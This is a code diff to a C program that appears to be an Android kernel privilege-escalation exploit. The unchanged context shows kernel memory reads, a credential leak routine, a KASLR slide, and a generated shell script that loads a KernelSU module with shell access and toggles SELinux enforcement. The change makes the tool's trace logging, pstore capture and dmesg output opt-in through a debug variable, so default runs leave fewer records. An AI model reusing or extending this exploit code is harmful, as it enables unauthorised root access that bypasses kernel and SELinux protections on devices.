@@ -103,6 +103,7 @@ static unsigned long long g_base;
 static unsigned long long g_slide;
 static int g_held;
 static int g_fake_stage;
+static int g_debug_logging;
 static pid_t g_runner_pid;
 static int g_child_entry;
 static unsigned long long g_child_task;
@@ -1161,6 +1162,8 @@ static int hkd_read64(int fds, unsigned long long addr,
  * so a later crash never loses the evidence. */
 static void hkd_capture_diag(void)
 {
+    if (!g_debug_logging)
+        return;
     static const char *ps[] = {
         "/sys/fs/pstore/console-ramoops-0",
         "/sys/fs/pstore/console-ramoops-1",
@@ -1302,7 +1305,7 @@ static int run_ksu_stage_worker(const char *tag)
     write_ksu_script();
     /* Reset-surviving bracket around the fork/exec: append + fsync
      * (page-cache-only logs die on panic and pstore is dead here). */
-    {
+    if (g_debug_logging) {
         int kf = open("/data/local/tmp/ksu-trace.log",
                       O_WRONLY | O_CREAT | O_APPEND, 0666);
 
@@ -1334,7 +1337,7 @@ static int run_ksu_stage_worker(const char *tag)
     }
     if (fw > 0)
         waitpid(fw, &fst, 0);
-    {
+    if (g_debug_logging) {
         int kf = open("/data/local/tmp/ksu-trace.log",
                       O_WRONLY | O_CREAT | O_APPEND, 0666);
 
@@ -2025,7 +2028,11 @@ static void write_ksu_script(void)
         "#!/system/bin/sh\n"
         "set -u\n"
         "TRACE=/data/local/tmp/ksu-trace.log\n"
-        "km() { echo \"[$(date +%H:%M:%S)] $*\" >> \"$TRACE\"; sync; }\n"
+        "km() {\n"
+        "    message=\"[$(date +%H:%M:%S)] $*\"\n"
+        "    echo \"$message\"\n"
+        "    if [ \"${KSU_RUNNER_DEBUG:-0}\" = 1 ]; then echo \"$message\" >> \"$TRACE\"; sync; fi\n"
+        "}\n"
         "module_live() { grep -q '^kernelsu .* Live ' /proc/modules; }\n"
         "if module_live; then\n"
         "    echo KSU_LOADED\n"
@@ -2049,7 +2056,7 @@ static void write_ksu_script(void)
         "/data/local/tmp/insmodf /data/local/tmp/kernelsu-p.ko 0 allow_shell=1\n"
         "rc=$?\n"
         "km \"candidate insmodf rc=$rc\"\n"
-        "dmesg 2>/dev/null | tail -60\n"
+        "if [ \"${KSU_RUNNER_DEBUG:-0}\" = 1 ]; then dmesg 2>/dev/null | tail -60; fi\n"
         "if [ \"$rc\" -eq 0 ] && module_live; then\n"
         "    echo KSU_LOADED\n"
         "    echo 1 > /sys/fs/selinux/enforce\n"
@@ -2634,7 +2641,8 @@ static unsigned long long leak_cred(unsigned char *raw,
                 const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
                 char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                     (char *)cmode, NULL};
-                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};
+                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin",
+                    g_debug_logging ? (char *)"KSU_RUNNER_DEBUG=1" : (char *)"KSU_RUNNER_DEBUG=0", NULL};
 
                 execve("/proc/self/exe", av, ep);
             }
@@ -3028,6 +3036,7 @@ int main(int argc, char **argv)
     unsigned char *raw;
     int shell_mode = 0, leak_only = 0, ids_only = 0;
 
+    g_debug_logging = getenv("KSU_RUNNER_DEBUG") && !strcmp(getenv("KSU_RUNNER_DEBUG"), "1");
     g_runner_pid = getpid();
     g_child_entry = (argc > 1 && !strcmp(argv[1], "wait")) ||
                     (argv[0] && argv[0][0] == '\0');
